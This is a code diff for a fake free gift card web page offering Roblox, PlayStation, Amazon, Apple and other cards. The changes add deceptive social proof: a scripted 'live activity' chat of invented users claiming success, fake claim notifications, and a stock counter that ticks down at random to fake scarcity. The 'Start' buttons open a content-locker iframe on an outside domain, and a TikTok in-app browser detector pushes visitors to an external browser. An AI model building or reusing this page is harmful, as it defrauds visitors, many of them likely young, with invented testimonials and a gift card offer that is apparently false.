@@ -40,6 +40,71 @@ z-index:-3;
 100%{transform:scale(1.12) translateY(-18px);}
 }
 
+/* --- TT OVERLAY GIF STYLE --- */
+#ttOverlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.98);
+    display: none;
+    justify-content: center; 
+    align-items: center; 
+    flex-direction: column; 
+    z-index: 999999; 
+    text-align: center; 
+    padding: 20px;
+}
+#ttOverlay h2 { font-size: 28px; font-weight: 800; margin-bottom: 10px; color: #fff; }
+#ttOverlay h2 span { color: #60a5fa; }
+#ttOverlay p { opacity: .7; margin-bottom: 25px; font-size: 14px; line-height: 1.4; }
+
+.iphone-container {
+    position: relative;
+    width: 250px;
+    height: 500px;
+    background: #000;
+    border-radius: 40px;
+    padding: 8px;
+    border: 4px solid #1a1a1a;
+    box-shadow: 0 0 50px rgba(59, 130, 246, 0.5);
+    overflow: hidden;
+}
+#tutorialVideo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 32px;
+}
+
+/* NOTIFICATION STYLE */
+#notification-toast {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background: rgba(10, 10, 10, 0.98);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(15px);
+    padding: 14px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    z-index: 10000;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    transform: translateX(-160%);
+    transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+    max-width: 320px;
+}
+#notification-toast.show { transform: translateX(0); }
+.notif-img-container {
+    width: 45px; height: 45px; background: #fff; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 5px;
+}
+.notif-img-container img { width: 100%; height: 100%; object-fit: contain; }
+.notif-content { font-size: 13px; line-height: 1.4; }
+.notif-user { font-weight: 800; color: #60a5fa; }
+.notif-card-name { color: #a855f7; font-weight: 700; }
+.notif-time { display: block; font-size: 10px; opacity: 0.5; margin-top: 3px; }
+
 .header{text-align:center;padding:34px 15px 20px}
 .title{
 font-size:34px;
@@ -92,7 +157,38 @@ border-radius:999px;
 font-size:11px;
 background:rgba(96,165,250,.14);
 color:#93c5fd;
+transition: all 0.4s ease;
 }
+
+/* LIVE CHAT AREA */
+.chat-container {
+    max-width: 580px;
+    margin: 40px auto 20px;
+    padding: 0 18px;
+}
+.chat-box {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 20px;
+    padding: 20px;
+    height: 300px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    scrollbar-width: none;
+}
+.chat-box::-webkit-scrollbar { display: none; }
+.chat-msg {
+    background: rgba(255, 255, 255, 0.05);
+    padding: 12px 16px;
+    border-radius: 15px;
+    border-left: 3px solid #60a5fa;
+    animation: fadeInChat 0.5s ease;
+}
+@keyframes fadeInChat { from { opacity:0; transform: translateY(5px); } to { opacity:1; transform: translateY(0); } }
+.chat-user { font-size: 13px; font-weight: 800; color: #60a5fa; display: flex; justify-content: space-between; }
+.chat-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
 
 .loading{
 position:fixed;
@@ -215,43 +311,34 @@ font-weight:bold;
 .grid{grid-template-columns:1fr}
 .title{font-size:28px}
 #selectedTitle{font-size:23px}
-}
-
-/* TikTok overlay */
-#ttOverlay{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.96);
-display:none;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-z-index:999999;
-text-align:center;
-padding:20px;
-}
-#ttOverlay h2{margin-bottom:10px}
-#ttOverlay p{opacity:.7;margin-bottom:20px}
-#ttOverlay button{
-padding:12px 18px;
-border:none;
-border-radius:10px;
-background:#3b82f6;
-color:#fff;
-font-weight:800;
-cursor:pointer;
+#notification-toast { left: 10px; right: 10px; bottom: 10px; width: auto; }
 }
 </style>
 </head>
 
 <body>
 
-<!-- TikTok Overlay -->
 <div id="ttOverlay">
-<h2>Open in Browser</h2>
-<p>1- Tap the three dots at the top right
-2- Tap Open in browser</p>
-<button onclick="openChrome()">Open Now</button>
+    <h2>Open in <span>Browser</span></h2>
+    <p>1- Tap the three dots at the top right<br>2- Tap "Open in browser" to continue</p>
+    <div class="iphone-container">
+        <video id="tutorialVideo" playsinline muted loop autoplay preload="auto">
+            <source src="tutorial.mp4.mov" type="video/quicktime">
+            <source src="tutorial.mp4.mov" type="video/mp4">
+        </video>
+    </div>
+</div>
+
+<div id="notification-toast">
+    <div class="notif-img-container">
+        <img src="" id="notif-img">
+    </div>
+    <div class="notif-content">
+        <span class="notif-user" id="notif-user"></span> 
+        successfully claimed a 
+        <span class="notif-card-name" id="notif-card-name"></span>
+        <span class="notif-time" id="notif-time"></span>
+    </div>
 </div>
 
 <div class="header">
@@ -260,49 +347,49 @@ cursor:pointer;
 </div>
 
 <div class="grid" id="grid">
-
-<div class="card" onclick="openOffer('ROBLOX 20$-50$ CARD', this)">
-<img src="https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png">
-<div class="name">ROBLOX</div>
-<div class="price">$20 - $50</div>
-<div class="tag">Still 46 Card</div>
+    <div class="card" onclick="openOffer('ROBLOX 20$-50$ CARD', this)">
+        <img src="https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png">
+        <div class="name">ROBLOX</div>
+        <div class="price">$20 - $50</div>
+        <div class="tag stock-count" id="stock-0">Still 46 Card</div>
+    </div>
+    <div class="card" onclick="openOffer('PLAYSTATION 25$-50$ CARD', this)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
+        <div class="name">PLAYSTATION</div>
+        <div class="price">$25 - $50</div>
+        <div class="tag stock-count" id="stock-1">Still 37 Card</div>
+    </div>
+    <div class="card" onclick="openOffer('AMAZON 20$-150$ CARD', this)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
+        <div class="name">AMAZON</div>
+        <div class="price">$20 - $150</div>
+        <div class="tag stock-count" id="stock-2">Still 61 Card</div>
+    </div>
+    <div class="card" onclick="openOffer('APPLE 20$-75$ CARD', this)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+        <div class="name">APPLE</div>
+        <div class="price">$20 - $75</div>
+        <div class="tag stock-count" id="stock-3">Still 50 Card</div>
+    </div>
+    <div class="card" onclick="openOffer('GOOGLE PLAY 10$-100$ CARD', this)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg">
+        <div class="name">GOOGLE PLAY</div>
+        <div class="price">$10 - $100</div>
+        <div class="tag stock-count" id="stock-4">Still 72 Card</div>
+    </div>
+    <div class="card" onclick="openOffer('NETFLIX 30$-50$ CARD', this)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
+        <div class="name">NETFLIX</div>
+        <div class="price">$30 - $50</div>
+        <div class="tag stock-count" id="stock-5">Still 28 Card</div>
+    </div>
 </div>
 
-<div class="card" onclick="openOffer('PLAYSTATION 25$-50$ CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
-<div class="name">PLAYSTATION</div>
-<div class="price">$25 - $50</div>
-<div class="tag">Still 37 Card</div>
-</div>
-
-<div class="card" onclick="openOffer('AMAZON 20$-150$ CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
-<div class="name">AMAZON</div>
-<div class="price">$20 - $150</div>
-<div class="tag">Still 61 Card</div>
-</div>
-
-<div class="card" onclick="openOffer('APPLE 20$-75$ CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-<div class="name">APPLE</div>
-<div class="price">$20 - $75</div>
-<div class="tag">Still 50 Card</div>
-</div>
-
-<div class="card" onclick="openOffer('GOOGLE PLAY 10$-100$ CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg">
-<div class="name">GOOGLE PLAY</div>
-<div class="price">$10 - $100</div>
-<div class="tag">Still 72 Card</div>
-</div>
-
-<div class="card" onclick="openOffer('NETFLIX 30$-50$ CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
-<div class="name">NETFLIX</div>
-<div class="price">$30 - $50</div>
-<div class="tag">Still 28 Card</div>
-</div>
-
+<div class="chat-container" id="chatArea">
+    <div style="font-size: 14px; font-weight: 700; margin-bottom: 10px; color: #60a5fa; display: flex; align-items: center; gap: 8px;">
+        <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%;"></span> LIVE ACTIVITY
+    </div>
+    <div class="chat-box" id="chatBox"></div>
 </div>
 
 <div class="loading" id="loading">
@@ -312,85 +399,146 @@ cursor:pointer;
 
 <div class="offerPage" id="offerPage">
 <div class="box">
-
 <img id="selectedImage" class="selectedImage">
 <div id="selectedTitle"></div>
-
-<div class="option">
-<div class="opt">Fast Verification</div>
-<button onclick="go()">Start</button>
-</div>
-
-<div class="option">
-<div class="opt">Backup Option</div>
-<button onclick="go()">Start</button>
-</div>
-
+<div class="option"><div class="opt">Fast Verification</div><button onclick="go()">Start</button></div>
+<div class="option"><div class="opt">Backup Option</div><button onclick="go()">Start</button></div>
 <button class="back" onclick="backPage()">← Back</button>
-
 </div>
 </div>
 
-<div id="lockerModal">
-<div class="lockerBox">
-<iframe id="lockerFrame"></iframe>
-<button class="closeBtn" onclick="closeLocker()">✕</button>
-</div>
-</div>
-
+<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe><button class="closeBtn" onclick="closeLocker()">✕</button></div></div>
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
+// --- YOUR ORIGINAL MESSAGES ---
+const giftCardMsgs = [
+    "Fuck! I only got $10 card while others got $100. My luck is literally trash.",
+    "Is this actually real? I've been scammed 4 times today on other sites.",
+    "Guys, it worked! But you can only claim 1 card per person.",
+    "Is everyone getting their codes? Just started the offer.",
+    "Wait... just got the notification. It's actually legit! $50 added.",
+    "I'm skeptical... let me try one more time. Does this really work?",
+    "FUCK!! 10$ again... i hate my life. Why can't I get the big ones?",
+    "Yo it works! Just finished the survey and code popped up instantly.",
+    "Warning: You can only benefit from 1 card. Don't waste time trying more.",
+    "Has anyone received the code yet? I'm almost done.",
+    "Just finished the offer and the code was sent in the notification bar!",
+    "Omg it worked!! Finally a real generator for 2026.",
+    "Did you guys get the card? I just got $25 PSN code.",
+    "Can believe it... $100 Amazon just worked. My heart is racing lol.",
+    "Verification took 5 mins but the $50 Apple code is 100% working.",
+    "Only 1 card per account guys. It won't let you do more.",
+    "Fuck this site, why did i only get the 10$ one? So unfair.",
+    "I just got my code in the notification after completing the task. Legit!",
+    "Is it just me or is the Google Play card hard to get? Trying again.",
+    "Stop asking if it's real. Just do the offer and see for yourself."
+];
+
+const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip", "Chris_USA", "Sophia_M", "Ryan.K", "Olivia_S", "Ava_N", "Mia_F", "Chloe_B", "David.W", "Nathan_V", "Zoe_M"];
+
+const cardsData = [
+    {n: "Roblox $50", img: "https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png"},
+    {n: "PlayStation $25", img: "https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg"},
+    {n: "Amazon $100", img: "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"},
+    {n: "Apple $50", img: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"},
+    {n: "Google Play $100", img: "https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg"}
+];
+
+let usedMessages = [];
+let stocks = [46, 37, 61, 50, 72, 28];
+
+function getUSATime() {
+    return new Intl.DateTimeFormat('en-GB', {
+        timeZone: 'America/New_York',
+        hour: '2-digit',
+        minute: '2-digit',
+        hour12: false
+    }).format(new Date());
+}
+
+function updateStock() {
+    const idx = Math.floor(Math.random() * 6);
+    const tag = document.getElementById(`stock-${idx}`);
+    if (stocks[idx] > 2) {
+        stocks[idx] -= 1;
+        tag.innerText = `Still ${stocks[idx]} Card`;
+        tag.style.background = "rgba(239, 68, 68, 0.2)";
+        tag.style.color = "#ff4d4d";
+        tag.style.transform = "scale(1.1)";
+        setTimeout(() => {
+            tag.style.background = "rgba(96,165,250,.14)";
+            tag.style.color = "#93c5fd";
+            tag.style.transform = "scale(1)";
+        }, 800);
+    }
+    setTimeout(updateStock, Math.random() * (25000 - 15000) + 15000);
+}
+
+function showNotif() {
+    const toast = document.getElementById('notification-toast');
+    const u = usersList[Math.floor(Math.random()*usersList.length)];
+    const c = cardsData[Math.floor(Math.random()*cardsData.length)];
+    document.getElementById('notif-user').innerText = "@" + u;
+    document.getElementById('notif-img').src = c.img;
+    document.getElementById('notif-card-name').innerText = c.n + " Card";
+    document.getElementById('notif-time').innerText = "Today at " + getUSATime();
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); }, 4000);
+    setTimeout(showNotif, Math.random() * (15000 - 9000) + 9000);
+}
+
+function addChat() {
+    const box = document.getElementById('chatBox');
+    const u = usersList[Math.floor(Math.random()*usersList.length)];
+    
+    let availableMsgs = giftCardMsgs.filter(m => !usedMessages.includes(m));
+    if (availableMsgs.length === 0) {
+        usedMessages = [];
+        availableMsgs = giftCardMsgs;
+    }
+    
+    const m = availableMsgs[Math.floor(Math.random()*availableMsgs.length)];
+    usedMessages.push(m);
+
+    const time = getUSATime();
+    const html = `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${time}</span></div><div class="chat-text">${m}</div></div>`;
+    box.innerHTML += html;
+    box.scrollTop = box.scrollHeight;
+    if(box.children.length > 10) box.removeChild(box.firstChild);
+    setTimeout(addChat, Math.random() * (12000 - 4000) + 4000);
+}
+
 function openOffer(title,el){
-const img = el.querySelector("img").src;
-
-document.getElementById("loading").style.display="flex";
-
-setTimeout(()=>{
-document.getElementById("loading").style.display="none";
-document.getElementById("grid").style.display="none";
-document.getElementById("offerPage").style.display="block";
-
-document.getElementById("selectedTitle").innerText=title;
-document.getElementById("selectedImage").src=img;
-window.scrollTo({top:0,behavior:"smooth"});
-},900);
+    const img = el.querySelector("img").src;
+    document.getElementById("loading").style.display="flex";
+    setTimeout(()=>{
+        document.getElementById("loading").style.display="none";
+        document.getElementById("grid").style.display="none";
+        document.getElementById("chatArea").style.display="none";
+        document.getElementById("offerPage").style.display="block";
+        document.getElementById("selectedTitle").innerText=title;
+        document.getElementById("selectedImage").src=img;
+        window.scrollTo(0,0);
+    },900);
 }
 
-function go(){
-document.getElementById("lockerModal").style.display="flex";
-document.getElementById("lockerFrame").src="https://authenticateapp.online/cl/i/pqq622";
-}
-
-function closeLocker(){
-document.getElementById("lockerModal").style.display="none";
-document.getElementById("lockerFrame").src="";
-}
-
-function backPage(){
-document.getElementById("offerPage").style.display="none";
-document.getElementById("grid").style.display="grid";
-}
-
-/* TikTok detect + overlay */
-function isTikTok(){
-return /TikTok|musical_ly/i.test(navigator.userAgent);
-}
-
-function openChrome(){
-const url = window.location.href;
-const intent = "intent://" + url.replace(/^https?:\/\//,'') +
-"#Intent;scheme=https;package=com.android.chrome;end;";
-window.location.href = intent;
-setTimeout(()=>{window.location.href=url},900);
-}
+function go(){ document.getElementById("lockerModal").style.display="flex"; document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622"; }
+function closeLocker(){ document.getElementById("lockerModal").style.display="none"; document.getElementById("lockerFrame").src=""; }
+function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
 
 window.addEventListener("load",()=>{
-if(isTikTok()){
-document.getElementById("ttOverlay").style.display="flex";
-}
+    showNotif();
+    updateStock(); 
+    for(let i=0; i<4; i++) { setTimeout(addChat, i * 1200); }
+    
+    // UPDATED TT LOGIC FOR VIDEO GIF
+    if(/TikTok|musical_ly/i.test(navigator.userAgent)) {
+        document.getElementById("ttOverlay").style.display="flex";
+        const v = document.getElementById("tutorialVideo");
+        v.play().catch(()=>{});
+    }
 });
 </script>
-
 </body>
 </html>
